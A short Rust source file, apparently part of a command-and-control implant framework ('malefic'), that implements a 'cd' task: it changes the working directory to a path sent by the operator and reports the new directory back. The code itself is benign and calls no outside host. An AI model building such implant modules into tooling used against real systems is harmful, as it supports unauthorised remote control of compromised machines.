use async_trait::async_trait;
use malefic_trait::module_impl;
use crate::{check_request, Module, Result, TaskResult};
use malefic_proto::proto::modulepb::Response;
use malefic_proto::proto::implantpb::spite::Body;

pub struct Cd {}

#[async_trait]
#[module_impl("cd")]
impl Module for Cd {
    #[allow(unused_variables)]
    async fn run(&mut self, id: u32, receiver: &mut crate::Input, sender: &mut crate::Output) -> Result {
        let request = check_request!(receiver, Body::Request)?;

        // 尝试设置当前目录，如果失败则返回错误
        std::env::set_current_dir(&request.input)?;

        // 正常逻辑
        let mut response = Response::default();
        let output = std::env::current_dir()?;
        response.output =  output.to_string_lossy().to_string();

        Ok(TaskResult::new_with_body(id, Body::Response(response)))
    }
}
